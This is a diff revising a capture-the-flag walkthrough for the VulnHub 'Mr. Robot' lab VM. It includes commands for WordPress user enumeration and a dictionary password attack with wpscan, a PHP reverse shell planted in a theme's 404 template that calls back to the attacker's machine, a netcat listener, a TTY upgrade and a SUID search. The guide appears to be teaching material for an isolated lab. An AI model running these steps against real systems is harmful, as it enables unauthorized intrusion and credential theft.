@@ -1,32 +1,44 @@
 # HAL 2020-03-03 - Mr. Robot
 
  * [Setup](#setup)
- * [Troubleshooting](#troubleshooting)
+   * [Troubleshooting](#troubleshooting)
  * [The Challenge](#the-challenge)
    * [Reconnaissance + Flag #1](#reconnaissance-and-flag-1)
    * [Privilege Escalation](#privilege-escalation)
      * [Flag #2](#flag-2)
-   * [Privilege Escalation](#privilege-escalation)
+   * [Privilege Escalation II](#privilege-escalation-ii)
      * [Flag #3](#flag-3)
 
-|||
-|---|---|
+||||
+|---|---|---|
 |Info|https://www.vulnhub.com/entry/mr-robot-1,151/||
-|Download| https://download.vulnhub.com/mrrobot/mrRobot.ova | Not working? use download link  [on this page](https://www.vulnhub.com/entry/mr-robot-1,151/)|
+|Download| https://download.vulnhub.com/mrrobot/mrRobot.ova | This link doesn't work! Go to [Info](https://www.vulnhub.com/entry/mr-robot-1,151/) and use the download link on that page.|
 |Torrent|https://download.vulnhub.com/mrrobot/mrRobot.ova.torrent||
 
 ## Setup
 
- 1. [Import Vulnerable VM](../instructions/import-vuln-vm.md)
- 2. [Setup nat network](../instructions/setup-nat-network.md)
- 3. [Enable network interface for kali](../instructions/kali-enable-eth0.md)
+**Overview**: We are going setup and use two virtual machines in virtualbox
 
-## Troubleshooting
+ * a kali linux VM which we will use as our 'workspace'
+ * a challenge vm which we will try to attack
+
+We will setup a private `NAT Network` between the two VM's such that they can communicate
+with each other, but no one else on the network can talk to your VM's
+
+**Steps:** To setup the two virtual machines:
+
+ 1. [Import kali linux VM](../instructions/setup-a-workspace-with-kali-linux.md)
+ 2. [Import Vulnerable VM](../instructions/import-vuln-vm.md)
+ 3. [Setup nat network](../instructions/setup-nat-network.md)
+ 4. Ensure both the Kali VM and the Vulnerable VM are using the nat network created in step 3.
+ 5. [Enable a network interface for kali](../instructions/kali-enable-eth0.md)
+
+### Troubleshooting
 
 **VM's are not visible to one another**
 
-Ensure you [setup a nat network](../instructions/setup-nat-network.md) and both
-vm's are using the same nat network.
+Ensure you [setup a NAT network](../instructions/setup-nat-network.md) and both
+vm's are using the same NAT network.
 
 **Kali Linux VM does not have IPv4 address**
 
@@ -45,8 +57,8 @@ Now we need to identify our target vulnerable VM. We can do this by scanning the
 
 Two tools which can help us do this are:
 
- * [netdiscover]()
- * [nmap]()
+ * [netdiscover - active/passive ARP reconnaissance tool](https://manpages.debian.org/unstable/netdiscover/netdiscover.8.en.html)
+ * [nmap -  network mapper](https://nmap.org/)
 
 Use the `man` command to find out more about each tool. E.g. `man nmap`
 
@@ -132,7 +144,7 @@ Let's find out more about this website. What is it? What does it do? Can we get 
 
 Tools:
 
- * [nikto]()
+ * [nikto](https://tools.kali.org/information-gathering/nikto)
 
 >**Warning!** Scanning websites that you do not have explicit permission to scan is considered abuse and may result in legal action against you.
 
@@ -192,11 +204,17 @@ http://10.0.2.5/wp-login/
 But we need a username and password to log in.
 
 Tools:
+ * [wpscan](https://wpscan.org/)
 
- * [wpscan]()
+Finding a username.
 
-```n
-root@kali:~# wpscan --url http://10.0.2.5/ -e u,t,p
+Wordpress will helpfully tell us if a user exists or not. If we try to log in with
+the username for a nonexistant user, wordpress will give us a different error message compared to if the username is correct.
+
+We could sit and try entering usernames manually but wp-scan is capable of automating this for us with the `-e`/`--enumerate` option.
+
+```
+root@kali:~# wpscan --url http://10.0.2.5/ -e u
 _______________________________________________________________
          __          _______   _____
          \ \        / /  __ \ / ____|
@@ -256,15 +274,6 @@ Interesting Finding(s):
 
 [i] The main theme could not be detected.
 
-[+] Enumerating Most Popular Plugins (via Passive Methods)
-
-[i] No plugins Found.
-
-[+] Enumerating Most Popular Themes (via Passive and Aggressive Methods)
- Checking Known Locations - Time: 00:00:11 <==========================================================================================================================================================> (400 / 400) 100.00% Time: 00:00:11
-
-[i] No themes Found.
-
 [+] Enumerating Users (via Passive and Aggressive Methods)
  Brute Forcing Author IDs - Time: 00:00:00 <============================================================================================================================================================> (10 / 10) 100.00% Time: 00:00:00
 
@@ -282,11 +291,26 @@ Interesting Finding(s):
 [+] Elapsed time: 00:00:18
 ```
 
-Try Username `Elliot`
+No success finding a username
 
 ```
-root@kali:~# cat fsociety.dic | sort | uniq > fsociety.dic
+[i] No Users Found.
 ```
+
+>**Hint:** Try Username `Elliot`.
+>Why elliot? Based on the theme of the challenge other participants found this user exists.
+
+Finding a password.
+
+We can try brute forcing the password using the fsocity.dic dictionary we found previously.
+
+The dictionary contains a lot of duplicate values so to speed uo the process and reduce duplicate guesses lets strip out duplicate values.
+
+```
+root@kali:~# cat fsocity.dic | sort | uniq > fsocuniq.dic
+```
+
+Let's use the dictionary to do a dictionary attack against the `Elliot` user.
 
 ```
 root@kali:~# wpscan --url http://10.0.2.5/ -U Elliot -P fsocuniq.dic
@@ -328,15 +352,20 @@ Progress Time: 00:00:51 <===================================
 [+] Elapsed time: 00:00:58
 ```
 
+We found a match
+
+```
+[i] Valid Combinations Found:
+ | Username: Elliot, Password: ER28-0652
+```
+
 |Username|Password|
 |---|---|
 |Elliot|ER28-0652|
 
-Let's try login with those credentials.
+Let's try login with those credentials. http://10.0.2.5/wp-login
 
-http://10.0.2.5/wp-login
-
-Success! And we are an admin user.
+Success! And we are an admin wordpress user.
 
 ## Reverse Shell
 
@@ -368,7 +397,8 @@ $shell = 'uname -a; w; id; /bin/sh -i';
 $daemon = 0;
 $debug = 0;
 ```
-Change to the IP addess to the IP addess of our own kali VM which you can find by running `ifconfig eth0` again.
+
+Change to the IP address to the IP address of our own kali VM which you can find by running `ifconfig eth0` again.
 
 Leave `$port` as is.
 ```php
@@ -376,15 +406,12 @@ $ip = '10.0.2.15';  // CHANGE THIS
 $port = 1234;       // CHANGE THIS
 ```
 
-Save the template.
-
-When the script is run it will try to establish a TCP nework connection to the configured ip address (`10.0.2.15`) and port (`1234`).
+Save the template. When the script is run it will try to establish a TCP network connection to the configured ip address (`10.0.2.15`) and port (`1234`).
 
 Before we trigger the script we need to configure our computer to listen for a connection on port `1234`.
 
 Tools:
-
- * [netcat / nc]()
+ * [netcat/nc - arbitrary TCP and UDP connections and listens](https://linux.die.net/man/1/nc)
 
 Netcat, or `nc` for short, is a swiss army knife for all such networking tasks.
 
@@ -395,7 +422,7 @@ root@kali:~# nc -nvlp 1234
 listening on [any] 1234 ...
 ```
 
-Now, while the netcat listener is running trigger the reverse shell script by visiting a non existant URL on the website, causing wordpress to process the  `404 Template` with our reverse shell script.
+Now, while the netcat listener is running trigger the reverse shell script by visiting a non existent URL on the website, causing wordpress to process the  `404 Template` with our reverse shell script.
 
 http://10.0.2.5/idontexist
 
@@ -414,7 +441,7 @@ uid=1(daemon) gid=1(daemon) groups=1(daemon)
 $ 
 ```
 
-Congratuations you now have an interactive reverse shell to the website. But what can we do with that?
+Congratulations you now have an interactive reverse shell to the website. But what can we do with that?
 
 ## Privilege Escalation
 
@@ -425,9 +452,9 @@ $ whoami
 daemon
 ```
 
-Currently we are logged in as the daemon - the process which the website is running on. Good sysadmins normally try to minimise daemon processes access all unecessary parts of the system so we could try switch to a different user.
+Currently we are logged in as the daemon - the process which the website is running on. Good sysadmins normally try to minimize daemon processes access all unnecessary parts of the system so we could try switch to a different user.
 
-Lets see what users have home folders on the serer.
+Lets see what users have home folders on the server.
 
 ```
 $ ls -Rhal /home/*
@@ -448,7 +475,11 @@ cat: /home/robot/key-2-of-3.txt: Permission denied
 
 Unfortunately we can't read it. Based on the file permission (`-r--------`) only robot and no one else can read that file.
 
+[Learn more: Linux File Permissions](http://linuxcommand.org/lc3_lts0090.php)
+
 We can however read password.raw-md5 which has less restrictive file permissions (`-rw-r--r--`)
+
+
 
 ```
 $ cat /home/robot/password.raw-md5              
@@ -491,12 +522,16 @@ To use `su` we need to be logged in to a TTY terminal which we currently are not
 
 No worries though! There's a myriad of ways we can get one detailed here https://netsec.ws/?p=337
 
+We'll use this one
 
 ```
 $ python -c 'import pty; pty.spawn("/bin/sh")'
+$
 ```
 
-No news is good news. Lets try login as robot again.
+In linux No news is good news - if we didn't see an error it was probably ok.
+
+Lets try login as robot again.
 
 ```
 $ su robot
@@ -515,11 +550,11 @@ robot@linux:/$ cat ~/key-2-of-3.txt
 
 # Flag #3
 
-## Further Privlege Escalation
+## Privilege Escalation II
 
 We managed to log in as a proper user on the server. Buy why stop now? We want `root`
 
-Let's look for binaries with the [SUID bit]() set on their file permission
+Let's look for binaries with the [SUID bit](https://www.linuxnix.com/suid-set-suid-linuxunix/) set on their file permission
 
 ```bash
 robot@linux:~$ find / -perm -4000 2>/dev/null
